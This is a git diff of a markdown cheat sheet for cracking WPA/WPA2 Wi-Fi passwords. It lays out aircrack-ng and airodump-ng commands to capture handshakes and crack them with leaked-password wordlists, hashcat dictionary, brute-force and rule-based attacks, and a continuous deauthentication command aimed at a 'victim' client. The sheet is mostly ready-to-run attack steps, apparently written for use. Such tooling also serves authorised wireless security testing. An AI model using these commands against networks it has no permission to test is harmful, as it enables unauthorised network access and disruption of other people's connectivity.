@@ -1,67 +1,87 @@
 # Verify that airmon-ng has no issues:
+```
 sudo airmon-ng check 
-
+```
 # Kill any issues with using airmon-ng:
+```
 sudo airmon-ng check kill
-
+```
 # Find Network Interface Cards:
 "ip addr" or "ifconfig"
 
 #  Start airmon-ng on interface:
+```
 sudo airmon-ng start wlp1s0
-
+```
 # Start monitor mode on interface:
+```
 sudo airodump-ng wlp1s0mon
-
+```
 # Save packets from airodump:
 ### sudo airodump-ng -w [Save to this File Name] -c [Channel#] [Interface]
+```
 sudo airodump-ng -w New -c 2 wlp1s0mon
+```
 ### sudo airodump-ng -c [Channel#] --bssid [bssid MAC] -w [Save to this File Name] [Interface]
+```
 sudo airodump-ng -c 4 --bssid 00:00:00:00:00:00 -w New  wlp1s0mon
+```
 ### ***wait for "WPA handshake" to show up in the top right corner***
 
 # Stop monitor mode on interface:
+```
 sudo airmon-ng stop wlp1s0mon
-
+```
 # Start Network Manager so you can get back online:
+```
 sudo service network-manager start
-
+```
 # Use aircrack and passwordlist of your choice:
 ### sudo aircrack-ng -w [Password list] [Name of CAP file] 
+```
 sudo aircrack-ng -w ~/github/ChickenManGame/ChickenDay/passwords/darkweb2017-top10000.txt New-01.cap 
-
+```
 ### sudo aircrack-ng -a2 specifies WPA2, -b is the bssid, -w is the wordfile
+```
 sudo aircrack-ng -a2 -b 60:38:E0:D3:AC:45 -w ~/passwords2.txt New-01.cap 
-
 sudo aircrack-ng -a2 -w ~/new-list2.txt New-01.cap 
-
+```
 
 
 # clean up cap to convert
+```
 wpaclean clean.cap original.cap 
-
+```
 # convert to use hashcat 
 ### make hccapx
+```
 aircrack-ng -j clean clean.cap
+```
 ### make hccap
+```
 aircrack-ng -J clean clean.cap
+```
 
-
-Dictionaries:
+# Dictionaries:
 1. https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
 2. https://wiki.skullsecurity.org/Passwords
 3. https://haveibeenpwned.com/Passwords
 
 # Hashcat
 ### Dictionary Attack
+```
 hashcat -m 2500 capture.hccapx wordlist.txt
+```
 ### Brute-Force Attack
+```
 hashcat -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d
 hashcat -m 2500 -a3 capture.hccapx ?h?h?h?h?h?h?h?h
 hashcat -m 2500 -a3 capture.hccapx ?H?H?H?H?H?H?H?H
+```
 ### Rule Based Attack
+```
 hashcat -m 2500 -r rules/best64.rule capture.hccapx wordlist.txt
-
+```
 # Hashcat Help Info:
 ```
        -b, --benchmark
@@ -231,4 +251,19 @@ Specific hash type:
        3711 = Mediawiki B type
        3721 = WebEdition CMS
        7600 = Redmine Project Management Web App
+```
+
+
+
+# Deauthenticating Device from the network
+```
+aireplay-ng -0 0 -a <AP-MAC> -c <Victim-Mac> wlan0mon
+```
+Command instructions:
+```
+-0 means deauthentication.
+ 0 is the number of deauths to send 0 means send them continuously, you can send 10 if you want the target to disconnect and reconnect.
+-a 50:C7:BF:DC:4C:E8 is the MAC address of the access point we are targeting.
+-c E0:B5:2D:EA:18:A7 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated.
+wlan0mon is the interface name.
 ```
